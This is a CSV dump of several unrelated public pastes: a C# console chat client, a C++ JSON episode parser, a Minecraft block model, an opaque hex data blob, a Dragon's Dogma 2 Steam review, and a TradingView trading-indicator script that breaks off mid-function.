id,title,username,language,date,content
TDp2D6Pk,Client,Dimaland,C#,Monday 1st of April 2024 06:54:55 AM CDT,"using System.Net.Sockets;

string host = ""127.0.0.1"";
int port = 8888;
using TcpClient client = new TcpClient();
Console.Write(""Введите свое имя: "");
string? userName = Console.ReadLine();
Console.WriteLine($""Добро пожаловать, {userName}"");
StreamReader? Reader = null;
StreamWriter? Writer = null;

try
{
    client.Connect(host, port); //подключение клиента
    Reader = new StreamReader(client.GetStream());
    Writer = new StreamWriter(client.GetStream());
    if (Writer is null || Reader is null) return;
    // запускаем новый поток для получения данных
    _ = Task.Run(() => ReceiveMessageAsync(Reader));
    // запускаем ввод сообщений
    await BroadcastSendMessageAsync(Writer);
}
catch (Exception ex)
{
    Console.WriteLine(ex.Message);
}
Writer?.Close();
Reader?.Close();

// отправка сообщений всем пользователям
async Task BroadcastSendMessageAsync(StreamWriter writer)
{
    // сначала отправляем имя
    await writer.WriteLineAsync(userName);
    await writer.FlushAsync();
    Console.WriteLine(""Вы в общем чате"");
    Console.WriteLine(""Для отправки сообщений введите сообщение и нажмите Enter"");

    while (true)
    {
        string? message = Console.ReadLine();
        if (message == ""2"")
            message = await PersonalSendMessageAsync(writer);
        await writer.WriteLineAsync(message);
        await writer.FlushAsync();
    }
}

// отправка личных сообщений сообщений 
async Task<string?> PersonalSendMessageAsync(StreamWriter writer)
{
    await writer.WriteLineAsync(""send to"");
    Console.WriteLine(""Введите имя человека с которому хотите написать личное сообщение"");
    string? name = Console.ReadLine();
    await writer.WriteLineAsync(name);
    await writer.FlushAsync();
    Console.WriteLine(""Для отправки сообщений введите сообщение и нажмите Enter"");

    return Console.ReadLine();
}

// получение сообщений
async Task ReceiveMessageAsync(StreamReader reader)
{
    while (true)
    {
        try
        {
            // считываем ответ в виде строки
            string? message = await reader.ReadLineAsync();
            // если пустой ответ, ничего не выводим на консоль
            if (string.IsNullOrEmpty(message)) continue;
            Print(message);//вывод сообщения
        }
        catch
        {
            break;
        }
    }
}
// чтобы полученное сообщение не накладывалось на ввод нового сообщения
void Print(string message)
{
    if (OperatingSystem.IsWindows())    // если ОС Windows
    {
        var position = Console.GetCursorPosition(); // получаем текущую позицию курсора
        int left = position.Left;   // смещение в символах относительно левого края
        int top = position.Top;     // смещение в строках относительно верха
        // копируем ранее введенные символы в строке на следующую строку
        Console.MoveBufferArea(0, top, left, 1, 0, top + 1);
        // устанавливаем курсор в начало текущей строки
        Console.SetCursorPosition(0, top);
        // в текущей строке выводит полученное сообщение
        Console.WriteLine(message);
        // переносим курсор на следующую строку
        // и пользователь продолжает ввод уже на следующей строке
        Console.SetCursorPosition(left, top + 1);
    }
    else Console.WriteLine(message);
}"
92SGFPkz,pull parsing json,honey_the_codewitch,C++,Monday 1st of April 2024 06:39:33 AM CDT,"char name[2048];
char overview[8192];
void read_episodes(json_reader_base& reader, Stream& output) {
    int root_array_depth = 0;
    // episodes opens with an array
    if(reader.read() && reader.node_type()==json_node_type::array) {
        root_array_depth = reader.depth();
        while(true) {
            // if we're at the end of the array, break
            if(reader.depth()==root_array_depth && 
                reader.node_type()==json_node_type::end_array) {
                break;
            }
            // read each ""episode object""
            if(reader.read()&&
                reader.node_type()==json_node_type::object) {
                
                int episode_object_depth = reader.depth();
                int season_number = -1;
                int episode_number = -1;
                while(reader.read() && 
                    reader.depth()>=episode_object_depth) {
                    // make sure we don't read any nested objects
                    // under this one
                    if(reader.depth()==episode_object_depth && 
                        reader.node_type()==json_node_type::field) {
                        if(0==strcmp(""episode_number"",reader.value()) && 
                            reader.read() && 
                            reader.node_type()==json_node_type::value) {
                            episode_number = reader.value_int();
                        }
                        if(0==strcmp(""season_number"",reader.value()) && 
                            reader.read() && 
                            reader.node_type()==json_node_type::value) {
                            season_number = reader.value_int();
                        }
                        // gather the name
                        if(0==strcmp(""name"",reader.value())) {
                            name[0]=0;
                            while(reader.read() && reader.is_value()) {
                                strcat(name,reader.value());
                            }
                        }
                        // gather the overview
                        if(0==strcmp(""overview"",reader.value())) {
                            overview[0]=0;
                            while(reader.read() && reader.is_value()) {
                                strcat(overview,reader.value());
                            }
                        }
                    }
                }
                if(season_number>-1 && episode_number>-1 && name[0]) {
                    output.printf(""S%02dE%02d %s\r\n"",
                        season_number,
                        episode_number,
                        name);
                    if(overview[0]) {
                        output.printf(""\t%s\r\n"",overview);
                    }
                    output.println("""");
                }
            }
        }
    }
}
void read_series(json_reader_base& reader, Stream& output) {
    while(reader.read()) {
        // find ""episodes""
        switch(reader.node_type()) {
            case json_node_type::field:
                if(0==strcmp(""episodes"",reader.value())) {
                    read_episodes(reader, output);
                }
                break;
            default:
                break;      
        }
    }
}"
mCfrt0AA,slab.3dj,opencomputerstest2,JSON,Monday 1st of April 2024 06:13:16 AM CDT,"{
  ""label"": ""Fence Slab"",
  ""shapesOff"": [
    { ""bounds"": [0,0,0,16,1,16], ""texture"": ""minecraft:block/oak_fence""},
    { ""bounds"": [0,7,0,16,8,16], ""texture"": ""minecraft:block/oak_fence""},
    { ""bounds"": [1,1,0,16,16,1], ""texture"": ""minecraft:block/oak_fence""},
    { ""bounds"": [0,1,0,1,16,16], ""texture"": ""minecraft:block/oak_fence""}
  ],
  ""shapesOn"": []
}"
AAi9aZ3m,data883,TestGuy1,JSON,Monday 1st of April 2024 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'b251a821d8f693678b66a2a9b6b74537dd2d3991017d6bf20945fa24747dfcf7579dc712da7c019ef8fa31b0626dc51d67595609de5faaf0fa001c59451f71f9f8526e466b909557eebaaf2e4261bb24222dbb099f8e433bb65cb940d4cf8b166761cfb70b80748ecfbedde130d02f11c65619a28265ae60a128928a1bc3292f',
  otherdata: [
    '9542bb7aae6983ab022a6fffb1e97895',
    '6d63198a14f34a412585b9f1d13a9256',
    'afd6925bb34aa23bcab05cd1b50f10e6',
    'd76901e50ea2e2ec9767d1f0d7b3b2b7',
    'd11ad2a0890d5f5057bb19128fb15a0e',
    '8c21479cf8a136b8c01f38dcd61c566f',
    '140e88bf4ea7eb88b3e75375297595f1',
    '07b32908b3de0eb910bc289b6e03d633'
  ]
}"
DnM6GejX,Dragon's Dogma 2 Steam Review,BitterBlack,HTML 5,Monday 1st of April 2024 05:59:24 AM CDT,"--- Finally another entry in the series for fans in the west. ---

(Small preamble on performance: Game ran decently well locked at 30fps on 3440x1440 resolution in my GTX 1080 i7-7700k system. Other than CPU frame-timing issues in the two big main towns of the game, I have no real complaints, and the game still looked pretty good despite the lowered settings. This is just my personal experience.)

After twelve years since the original, a game I was a fan of since I was half my age; Capcom and director Hideaki Itsuno finally give us a numbered sequel to the cult-classic original. Mild spoilers for the review ahead.



It's not the sequel I wanted.

The sequel 12 year old me wanted all those years ago; was a direct sequel to the first called Dragon's Dogma 2 released three-or-less years after Dark Arisen (which released a year after the original) that reused mostly the same assets to add even more monsters to fight, vocations to play, giving Warrior an L1 button, and building upon the storyline of the first, with improvements.
But that would've never happened, it didn't happen; especially for those of us in the west that never got to play Dragon's Dogma Online which did technically work on some of those aspects, but also while failing in others, and so... I reconciled those feelings long ago. 

It is clear instead, that Itsuno had different things in mind for this sequel. Some great, some not so great, but I can say that, after at least 80 hours of playtime, and finishing the game with the true ending... That I do appreciate what he's tried to do and accomplished with parts of this game nonetheless, and I accept it as a new entry in the franchise without any bitter feelings for the wait, so long as this foundation is worked upon for hopeful future installments (and we aren't made to wait 24 years next time). The little quirks of soul and inspiration that this game possesses, that my mind could've never thought or dreamed of, that carry forward the spirit of adventure and discovery that made me fall in love with the original alongside it's fresh action-RPG combat, are what keep me most positive about this.

I never would've thought of the Sphinx encounter, if I did it would be a simple boss fight of no consequence just like in DDON, nothing that really rocks the formula of other Dragon's Dogma encounters; but I wouldn't have thought of solving riddles and having a test of wit with the mythical beast like in the legends, I wouldn't have thought of being able to fulfill the Greek hero fantasy of being able to lop off a Medusa's head and using it's decapitated gaze to petrify any foe, even the final boss, I wouldn't have thought of pulling back on the handholding even harder for the game's questing  and exploration and leaning into the emergent narrative and gameplay possibilities of this game and it's pawns, I would've never considered the Beastren nation and all its little intricacies despite knowing they were cut content of the original concept or all the stuff dealing with the Sacred Elf Arbor, never would've thought of improvements like the different upgrade disciplines or the change to the previously RNG dragonforging system... So on and so forth.

My imagination extended to the first game, Dark Arisen and maybe some cut content, and it is these things that were outside of my imagination that are impressing me the most and will stick with me that make this game carve out it's own identity from the first. Alongside these new bits and pieces, there are ofcourse improvements to the climbing system such as being able to stand on parts of monsters strategically, monsters being able to lose their balance, giving more importance to heavy attacks due to the changes in the stagger mechanic, making the game less easy and long journeys more perilous with the addition of the Loss Gauge mechanic, among many others small to big improvements.

I think that, if you are a new fan especially and someone not familiar with the first game, this should be enough for you; to figure out if you would like this game or not. I do think even at it's current price point and especially on any sale there is still enough value for newcomers to have a fun time and enjoy a great japanese western-inspired RPG adventure. I'm sure it will only get better with patches, and as hardware catches up, like with Red Dead 2 or Cyberpunk.

. . .

However, I don't fault any long-time fan that waited as long as I did to finally have a sequel for being disappointed. I myself have some areas of major letdown of my own. Because unfortunately, there are glaring downgrades in certain areas of the game compared to the original as well, alongside the game suffering from lack of breadth of content in a few places. I will list them as sort of bullet points, in no particular order though I will try to order them from most feasible or simple to fix first, to make any potential Capcom rep or whomever fishing the reviews for any improvements to consider:

- The removal of the second skill palette.
     I understand this was replaced with the ""Vocation Skill"" instead; and that a few skills were incorporated into the vocations as core skills, and while it is certain vocation skills do serve to provide certain gameplay systems that make vocations better to play, such as with Mage/Sorcerer's quickspell (they've never felt better to play in this one sense) and Warrior's Barge, the loss of 2 active skills at anyone time is felt, and not in a way that I think enhances the game by encouraging Pawn team play or anything, the vocations most affected being the mages and Fighter, which just feel like you constantly have less options at your disposal to use than in the original. It certainly doesn't help that feeling, that for certain vocations the vocation skill is merely [i] the ability to aim. [/i] It's not like there isn't enough button real-state on the controller, the circle button is basically left without use 75% of the time if you set it to examine only and dash with the stick like in the original game, and the sheathe/draw button is as necessary (read: not) as it was in the original. Being able to at least change to another palette set by clicking both sticks in, like in DDON, would've been nice too. I'm not asking for Nioh or Dante stance-switching complexity here, or to be able to do everything, just not having less than the original game would've been good enough. It really feels like Warrior is the only categorical winner here.

- The number of vocations (and skills).

     While mystic spearhand is a fantastic new vocation to the roster of the series, especially with its Spirit Lancer from DDON inspirations, and Trickster is certainly... unique, let's be frank, a lot of us expected more vocations to play around with, especially with the omission of mystic knight (which I know was replaced by mystic spearhand, and that Warfarer is the replacement for Assassin), and with legacy vocations like Fighter barely having new skills not present in the original to play around with. Even as someone who plays every vocation to try them all out, and see what they all have to offer, I was left wanting for more. Why do only fighter and mage get an advanced vocation version? Where's advanced thief and archer? Why does only a magic hybrid with archer and fighter exist, where's the thief and mage hybrid?

    Addendum to this point: The removal of certain complexities. What happened to Holy Boon? Dark Boon? Where are spells like Necromancy and neat options like Exequy? Two entire categories of damage and magic almost completely gone, and while holy damage is still technically in the game, it is merely in the form of a few certain imbued weapons and ONE mage spell (and one party buff, but it doesn't deal direct damage). But that basically means no Blearing either, no Grapnel, no Lassitude (and Torpor status), no Miasma, no Perdition, no Sopor, no Holy Glare, that means nothing like Dark Anguish or any other dark/holy magic for mystic spearhand, the mystic knight replacement... It's dire. Really disappointing, frankly. You might say no one used those spells on mage or sorcerer anyway, but it's not like they got replaced with anything to compensate. It's just less options, for no real benefit.

- Enemy variety.

     While the roster of basic enemies is about on par if not slightly improved from at least the base version of the original, yet again, this game falters in the variety of large monsters. That's not to say some variants of small monsters, like hellhounds and giant undead aren't missing, they ARE, it's just that the large monsters are the ones that especially hurt. While the count is basically the same as the original, give or take, and it is true that some of the new monster overlap with functions of some monsters that didn't make the cut... It is still frankly disappointing nonetheless. We have spent 12 years mostly fighting cyclopses, ogres and occasional griffin or drake in the overworld... And it is mostly the same with this ""new"" entry. No cockatrices, no hydras, no evil eye, some variants like the metal golem, and while drakes can now cast all sorts of magic and aren't limited to fire magic thus removing the need for wyrms and wyverns... It still feels like at least a missed opportunity to not have brought at least everything from the original back ALONGSIDE the new stuff. [spoiler] Certainly doesn't help that at least two enemy types are locked behind the Unmoored World ""post-game"", as one-time boss fights. [/spoiler] Don't get me wrong! I understand they even included certain beasts from Dark Arisen into the game now like the garms and wargs, and the new additions like the aforementioned Medusa, the Minotaur and its Goreminotaur variant or the Dullahan are really cool! But this is definitely an area that any future piece of content of the franchise has to improve on, even more so than Dark Arisen.

- The removal of movement skills.

     Seriously, why does only mage and sorcerer get levitate? Where is double jump for thief and archer? (that one Thief skill does not count.) Due to the limited skill slottage it's not like people will use springboard or ladder launch for Fighter or Warrior either... I understand a lot of old-heads complain about the new movement system and the more dynamic terrain, I don't really land on one side or the other of the debate, but one thing that really felt missing while exploring was this.

- QOL annoyances/stuff missing from the first game.

     Why can't I equip stuff from inside storage anymore? Why is the max stack of items a pitiful, annoying, and easily met 99 that prevents you from placing more in storage when the original had a limit of like 999 or more? Why are my portcrystals wiped from where I placed them when I enter New Game+? Why must I go through the introduction again in New Game+ when the original let me skip Savan's segment? So many small things like these that are present that might seem inconsequential to the experience but really add up in the long run. I know Dark Arisen added QOL to the original in the form of various menu improvements, so working on these is not impossible.

- The music.
     Again, don't get me wrong. The music present here is great, and some tracks are very good, maybe even memorable.  Plus, I will not fault the game from missing certain tracks or changing tracks for certain monsters/scenarios since I'm sure there's some sort of co-ownership issue with Inon Zur or whatever... But man, the absence of the guitars and other rock inspiration for the sound suite of the game is really felt. The musical identity is just very different from the original, much more of a departure than even Dragon's Dogma Online, and in my opinion, not for the better. While the adrenaline still pumps when imminent triumph plays for sure, it just doesn't hit home as much as the original did. No cheesy, sincere licensed rock intro that encapsulates the spirit of the game, no cool guitar solo character creation music... Yeah, I just don't know what to feel, other than to say I simply prefer the original's music language.

- The lack of a meaningful endgame or some form of repeatable dungeon crawling, online boss.

     Yeah, the Unmoored World is there. But unlike the original's postgame and the Everfall, no new base or large enemy variants are unlocked, you are stuck to a time limit that leashes you in how long you can stay there, as well as being reset to the very beginning if you happened to die no matter if you rest at an inn or not and there's not a wide suite of new gear to chase. There's no Ur-Dragon equivalent either, so no collaborative bosses for the playerbase to work together to kill for rewards or to rank on the leaderboards... It's not like the Everfall was the most fantastic thing in the world, but it was something.
There's no New Game+ difficulty scaling just like with the original, so you spend most of the game plowing through easy mobs without a postgame to anchor to and stay at to keep at least savoring a bit of challenge in the longer-term. There's a few new things, but just not enough, no neat surprises. After waiting the better part of a decade, you do wish you had a bit more to chew on, and you just don't.

- The story (presentation).

     Despite being an avid defender of the original Dragon's Dogma 1's story, I will not pretend it was the most easy thing to follow, nor an easy plotline/worldview for a sequel to build upon, but it still had it's strengths. While I understand there are valid reasons I won't go into due to spoilers for some of these things being the case, the game just suffers from having even inferior story presentation to the first. The Dragon is barely present which I'm sure will confuse lots of people, weak antagonists and some subplots that go mostly nowhere (though I know some are relegated to their own side questlines), weird or sloppy cutscene structure (oddest fade to text I've seen, if you can even call it a fade, it just shows up), an anticlimactic end... Lorewise, I do like the narrative, and it's an interesting followup to the first game int that sense, but in execution it frankly dropped the ball. Even with the true ending it does feel in some sense like it all just ends quite suddenly and abruptly. Plus, no new game+ narrative surprises here either.

. . .

It may sound like I have more negatives than positives to say, but I don't. The game IS an improvement in many aspects, I like plenty of it and I had more fun playing it than I have with a new release in recent years, and a Capcom game since DMCV. It is precisely because I love the original Dragon's Dogma, and that I like this game; that I put forward all these points forward which they can improve upon so that it can hopefully become better and better. Whether that takes the form of Title Updates or an expansion that would hopefully put Dark Arisen to shame.
However, do note the difference in language there. In its current state, Dragon's Dogma 2 was simply unable to replace the unshakable, fond spot that the original game has in my heart, and in that sense, that's my biggest disappointment of all, not being able to bring myself to love it as much as I do the original, but it still retains it's soul and spirit, carrying it into the modern era, and thus I like it all the same. 

Newcomers have nothing to fear, it's an excellent jumping point for them to play this already.

And for the few of us present fans... The game is a spring of potential, just waiting to be fully tapped and unleashed with some sort of expansion like Monster Hunter World was with Iceborne, and this budding young franchise barely in its second entry still has room to grow with sequels, even disconnected from it's director as it has in the past with Dark Arisen and Dragon's Dogma Online, as other Capcom franchises like Monster Hunter and Resident Evil do.

In the end, with Dragon's Dogma II... It's a dichotomous game, both safe and bold at the same time, both an improvement and a downgrade, better and worse, larger and smaller, wilder and more restrained. My feelings on it still need to fully cement.

Sorry this review turned out to be so long, but I have been waiting for this game for pretty much half my entire life, unironically, so...
I just hope I don't have to wait another decade to find out which side of the dichotomy it will truly turn out to be, looking back. Please do give us more Capcom, don't make us wait too long for a sequel or expansion ever again."
x9HStM3A,Untitled,mody21221,TypeScript,Monday 1st of April 2024 05:46:37 AM CDT,"//@version=5

// Chandelier Exit script may be freely distributed under the terms of the GPL-3.0 license.
indicator('Chandelier Exit', shorttitle='CE', overlay=true, max_bars_back=500, max_lines_count=400, precision=4, max_labels_count=500)

length1 = input(title='ATR Period', defval=22)
mult = input.float(title='ATR Multiplier', step=0.1, defval=3.0)
showLabels = input(title='Show Buy/Sell Labels ?', defval=true)
useClose = input(title='Use Close Price for Extremums ?', defval=true)
highlightState = input(title='Highlight State ?', defval=true)

atr = mult * ta.atr(length1)

longStop = (useClose ? ta.highest(close, length1) : ta.highest(length1)) - atr
longStopPrev = nz(longStop[1], longStop)
longStop := close[1] > longStopPrev ? math.max(longStop, longStopPrev) : longStop

shortStop = (useClose ? ta.lowest(close, length1) : ta.lowest(length1)) + atr
shortStopPrev = nz(shortStop[1], shortStop)
shortStop := close[1] < shortStopPrev ? math.min(shortStop, shortStopPrev) : shortStop

var int dir = 1
dir := close > shortStopPrev ? 1 : close < longStopPrev ? -1 : dir

var color longColor = color.green
var color shortColor = color.red

longStopPlot = plot(dir == 1 ? longStop : na, title='Long Stop', style=plot.style_linebr, linewidth=2, color=color.new(longColor, 0))
buySignal = dir == 1 and dir[1] == -1
plotshape(buySignal ? longStop : na, title='Long Stop Start', location=location.absolute, style=shape.circle, size=size.tiny, color=color.new(longColor, 0))
plotshape(buySignal and showLabels ? longStop : na, title='Buy Label', text='Buy', location=location.absolute, style=shape.labelup, size=size.tiny, color=color.new(longColor, 0), textcolor=color.new(color.white, 0))

shortStopPlot = plot(dir == 1 ? na : shortStop, title='Short Stop', style=plot.style_linebr, linewidth=2, color=color.new(shortColor, 0))
sellSignal = dir == -1 and dir[1] == 1
plotshape(sellSignal ? shortStop : na, title='Short Stop Start', location=location.absolute, style=shape.circle, size=size.tiny, color=color.new(shortColor, 0))
plotshape(sellSignal and showLabels ? shortStop : na, title='Sell Label', text='Sell', location=location.absolute, style=shape.labeldown, size=size.tiny, color=color.new(shortColor, 0), textcolor=color.new(color.white, 0))

midPricePlot = plot(ohlc4, title='', style=plot.style_circles, linewidth=0, display=display.none, editable=false)

longFillColor = highlightState ? dir == 1 ? longColor : na : na
shortFillColor = highlightState ? dir == -1 ? shortColor : na : na
fill(midPricePlot, longStopPlot, title='Long State Filling', color=longFillColor, transp=90)
fill(midPricePlot, shortStopPlot, title='Short State Filling', color=shortFillColor, transp=90)

changeCond = dir != dir[1]
alertcondition(changeCond, title='Alert: CE Direction Change', message='Chandelier Exit has changed direction!')
alertcondition(buySignal, title='Alert: CE Buy', message='Chandelier Exit Buy!')
alertcondition(sellSignal, title='Alert: CE Sell', message='Chandelier Exit Sell!')
//*****************************************************************************************************************************************************
//ema
//********
shortest = ta.ema(close, 20)
short = ta.ema(close, 50)
longer = ta.ema(close, 100)
longest = ta.ema(close, 200)

plot(shortest, color=color.new(color.red, 0))
plot(short, color=color.new(color.orange, 0))
plot(longer, color=color.new(color.aqua, 0))
plot(longest, color=color.new(color.white, 0))

//**************************************************************************************
//dynamic risistance and support
//***********************************
prd = input.int(defval=10, title='Pivot Period', minval=4, maxval=30, group='Setup')
ppsrc = input.string(defval='High/Low', title='Source', options=['High/Low', 'Close/Open'], group='Setup')
maxnumpp = input.int(defval=20, title=' Maximum Number of Pivot', minval=5, maxval=100, group='Setup')
ChannelW = input.int(defval=10, title='Maximum Channel Width %', minval=1, group='Setup')
maxnumsr = input.int(defval=5, title=' Maximum Number of S/R', minval=1, maxval=10, group='Setup')
min_strength = input.int(defval=2, title=' Minimum Strength', minval=1, maxval=10, group='Setup')
labelloc = input.int(defval=20, title='Label Location', group='Colors', tooltip='Positive numbers reference future bars, negative numbers reference histical bars')
linestyle = input.string(defval='Dashed', title='Line Style', options=['Solid', 'Dotted', 'Dashed'], group='Colors')
linewidth = input.int(defval=2, title='Line Width', minval=1, maxval=4, group='Colors')
resistancecolor = input.color(defval=color.red, title='Resistance Color', group='Colors')
supportcolor = input.color(defval=color.lime, title='Support Color', group='Colors')
showpp = input(false, title='Show Point Points')

float src1 = ppsrc == 'High/Low' ? high : math.max(close, open)
float src2 = ppsrc == 'High/Low' ? low : math.min(close, open)
float ph2 = ta.pivothigh(src1, prd, prd)
float pl2 = ta.pivotlow(src2, prd, prd)

plotshape(ph2 and showpp, text='H', style=shape.labeldown, color=na, textcolor=color.new(color.red, 0), location=location.abovebar, offset=-prd)
plotshape(pl2 and showpp, text='L', style=shape.labelup, color=na, textcolor=color.new(color.lime, 0), location=location.belowbar, offset=-prd)

Lstyle = linestyle == 'Dashed' ? line.style_dashed : linestyle == 'Solid' ? line.style_solid : line.style_dotted

//calculate maximum S/R channel zone width
prdhighest = ta.highest(300)
prdlowest = ta.lowest(300)
cwidth = (prdhighest - prdlowest) * ChannelW / 100

var pivotvals = array.new_float(0)

if ph2 or pl2
    array.unshift(pivotvals, ph2 ? ph2 : pl2)
    if array.size(pivotvals) > maxnumpp  // limit the array size
        array.pop(pivotvals)

get_sr_vals(ind) =>
    float lo = array.get(pivotvals, ind)
    float hi = lo
    int numpp = 0
    for y = 0 to array.size(pivotvals) - 1 by 1
        float cpp = array.get(pivotvals, y)
        float wdth = cpp <= lo ? hi - cpp : cpp - lo
        if wdth <= cwidth  // fits the max channel width?
            lo := cpp <= lo ? cpp : lo
            hi := cpp > lo ? cpp : hi
            numpp += 1
            numpp
    [hi, lo, numpp]

var sr_up_level = array.new_float(0)
var sr_dn_level = array.new_float(0)
sr_strength = array.new_float(0)

find_loc(strength) =>
    ret = array.size(sr_strength)
    for i = ret > 0 ? array.size(sr_strength) - 1 : na to 0 by 1
        if strength <= array.get(sr_strength, i)
            break
        ret := i
        ret
    ret

check_sr(hi, lo, strength) =>
    ret = true
    for i = 0 to array.size(sr_up_level) > 0 ? array.size(sr_up_level) - 1 : na by 1
        //included?
        if array.get(sr_up_level, i) >= lo and array.get(sr_up_level, i) <= hi or array.get(sr_dn_level, i) >= lo and array.get(sr_dn_level, i) <= hi
            if strength >= array.get(sr_strength, i)
                array.remove(sr_strength, i)
                array.remove(sr_up_level, i)
                array.remove(sr_dn_level, i)
                ret
            else
                ret := false
                ret
            break
    ret

var sr_lines = array.new_line(11, na)
var sr_labels = array.new_label(11, na)

for x = 1 to 10 by 1
    rate = 100 * (label.get_y(array.get(sr_labels, x)) - close) / close
    label.set_text(array.get(sr_labels, x), text=str.tostring(label.get_y(array.get(sr_labels, x))) + '(' + str.tostring(rate, '#.##') + '%)')
    label.set_x(array.get(sr_labels, x), x=bar_index + labelloc)
    label.set_color(array.get(sr_labels, x), color=label.get_y(array.get(sr_labels, x)) >= close ? color.red : color.lime)
    label.set_textcolor(array.get(sr_labels, x), textcolor=label.get_y(array.get(sr_labels, x)) >= close ? color.white : color.black)
    label.set_style(array.get(sr_labels, x), style=label.get_y(array.get(sr_labels, x)) >= close ? label.style_label_down : label.style_label_up)
    line.set_color(array.get(sr_lines, x), color=line.get_y1(array.get(sr_lines, x)) >= close ? resistancecolor : supportcolor)

if ph2 or pl2
    //because of new calculation, remove old S/R levels
    array.clear(sr_up_level)
    array.clear(sr_dn_level)
    array.clear(sr_strength)
    //find S/R zones
    for x = 0 to array.size(pivotvals) - 1 by 1
        [hi, lo, strength] = get_sr_vals(x)
        if check_sr(hi, lo, strength)
            loc = find_loc(strength)
            // if strength is in first maxnumsr sr then insert it to the arrays 
            if loc < maxnumsr and strength >= min_strength
                array.insert(sr_strength, loc, strength)
                array.insert(sr_up_level, loc, hi)
                array.insert(sr_dn_level, loc, lo)
                // keep size of the arrays = 5
                if array.size(sr_strength) > maxnumsr
                    array.pop(sr_strength)
                    array.pop(sr_up_level)
                    array.pop(sr_dn_level)

    for x = 1 to 10 by 1
        line.delete(array.get(sr_lines, x))
        label.delete(array.get(sr_labels, x))

    for x = 0 to array.size(sr_up_level) > 0 ? array.size(sr_up_level) - 1 : na by 1
        float mid = math.round_to_mintick((array.get(sr_up_level, x) + array.get(sr_dn_level, x)) / 2)
        rate = 100 * (mid - close) / close
        array.set(sr_labels, x + 1, label.new(x=bar_index + labelloc, y=mid, text=str.tostring(mid) + '(' + str.tostring(rate, '#.##') + '%)', color=mid >= close ? color.red : color.lime, textcolor=mid >= close ? color.white : color.black, style=mid >= close ? label.style_label_down : label.style_label_up))

        array.set(sr_lines, x + 1, line.new(x1=bar_index, y1=mid, x2=bar_index - 1, y2=mid, extend=extend.both, color=mid >= close ? resistancecolor : supportcolor, style=Lstyle, width=linewidth))

f_crossed_over() =>
    ret = false
    for x = 0 to array.size(sr_up_level) > 0 ? array.size(sr_up_level) - 1 : na by 1
        float mid = math.round_to_mintick((array.get(sr_up_level, x) + array.get(sr_dn_level, x)) / 2)
        if close[1] <= mid and close > mid
            ret := true
            ret
    ret

f_crossed_under() =>
    ret = false
    for x = 0 to array.size(sr_up_level) > 0 ? array.size(sr_up_level) - 1 : na by 1
        float mid = math.round_to_mintick((array.get(sr_up_level, x) + array.get(sr_dn_level, x)) / 2)
        if close[1] >= mid and close < mid
            ret := true
            ret
    ret

alertcondition(f_crossed_over(), title='Resistance Broken', message='Resistance Broken')
alertcondition(f_crossed_under(), title='Support Broken', message='Support Broken')

//**************************************************************************************************

length = input.int(14)
k      = input.float(1.,'Slope',minval=0,step=.1)
method = input.string('Atr','Slope Calculation Method',
  options=['Atr','Stdev','Linreg'])
show   = input(false,'Show Only Confirmed Breakouts')
//----
upper = 0.,lower = 0.
slope_ph = 0.,slope_pl = 0.
src = close
n = bar_index
//----
ph = ta.pivothigh(length,length)
pl = ta.pivotlow(length,length)
slope = switch method
    'Atr'      => ta.atr(length)/length*k
    'Stdev'    => ta.stdev(src,length)/length*k
    'Linreg'   => math.abs(ta.sma(src*bar_index,length)-ta.sma(src,length)*ta.sma(bar_index,length))/ta.variance(n,length)/2*k

slope_ph := ph ? slope : slope_ph[1]
slope_pl := pl ? slope : slope_pl[1]

upper := ph ? ph : upper[1] - slope_ph
lower := pl ? pl : lower[1] + slope_pl
//----
single_upper = 0
single_lower = 0
single_upper := src[length] > upper ? 0 : ph ? 1 : single_upper[1]
single_lower := src[length] < lower ? 0 : pl ? 1 : single_lower[1]
upper_breakout = single_upper[1] and src[length] > upper and (show ? src > src[length] : 1)
lower_breakout = single_lower[1] and src[length] < lower and (show ? src < src[length] : 1)
plotshape(upper_breakout ? low[length] : na,""Upper Break"",shape.labelup,location.absolute,#26a69a,-length,text=""B"",textcolor=color.white,size=size.tiny)
plotshape(lower_breakout ? high[length] : na,""Lower Break"",shape.labeldown,location.absolute,#ef5350,-length,text=""B"",textcolor=color.white,size=size.tiny)
//----
var line up_l = na
var line dn_l = na
var label recent_up_break = na
var label recent_dn_break = na

if ph[1]
    line.delete(up_l[1])
    label.delete(recent_up_break[1])
    
    up_l := line.new(n-length-1,ph[1],n-length,upper,color=#26a69a,
      extend=extend.right,style=line.style_dashed)
if pl[1]
    line.delete(dn_l[1])
    label.delete(recent_dn_break[1])
    
    dn_l := line.new(n-length-1,pl[1],n-length,lower,color=#ef5350,
      extend=extend.right,style=line.style_dashed)

if ta.crossover(src,upper-slope_ph*length)
    label.delete(recent_up_break[1])
    recent_up_break := label.new(n,low,'B',color=#26a69a,
      textcolor=color.white,style=label.style_label_up,size=size.small)

if ta.crossunder(src,lower+slope_pl*length)
    label.delete(recent_dn_break[1])
    recent_dn_break := label.new(n,high,'B',color=#ef5350,
      textcolor=color.white,style=label.style_label_down,size=size.small)
    
//----
plot(upper,'Upper',color = ph ? na : #26a69a,offset=-length)
plot(lower,'Lower',color = pl ? na : #ef5350,offset=-length)

alertcondition(ta.crossover(src,upper-slope_ph*length),'Upper Breakout','Price broke upper trendline')
alertcondition(ta.crossunder(src,lower+slope_pl*length),'Lower Breakout','Price broke lower trendline')

//***********************************************************************************************************************
//hull suit
//***********

//Basic Hull Ma Pack tinkered by InSilico 

//INPUT
src3 = input(close, title='Source')
modeSwitch = input.string('Hma', title='Hull Variation', options=['Hma', 'Thma', 'Ehma'])
length3 = input(55, title='Length(180-200 for floating S/R , 55 for swing entry)')
lengthMult = input(1.0, title='Length multiplier (Used to view higher timeframes with straight band)')

useHtf = input(false, title='Show Hull MA from X timeframe? (good for scalping)')
htf = input.timeframe('240', title='Higher timeframe')

switchColor = input(true, 'Color Hull according to trend?')
candleCol = input(false, title='Color candles based on Hull\'s Trend?')
visualSwitch = input(true, title='Show as a Band?')
thicknesSwitch = input(1, title='Line Thickness')
transpSwitch = input.int(40, title='Band Transparency', step=5)

//FUNCTIONS
//HMA
HMA(_src3, _length3) =>
    ta.wma(2 * ta.wma(_src3, _length3 / 2) - ta.wma(_src3, _length3), math.round(math.sqrt(_length3)))
//EHMA    
EHMA(_src3, _length3) =>
    ta.ema(2 * ta.ema(_src3, _length3 / 2) - ta.ema(_src3, _length3), math.round(math.sqrt(_length3)))
//THMA    
THMA(_src3, _length3) =>
    ta.wma(ta.wma(_src3, _length3 / 3) * 3 - ta.wma(_src3, _length3 / 2) - ta.wma(_src3, _length3), _length3)

//SWITCH
Mode(modeSwitch, src3, len) =>
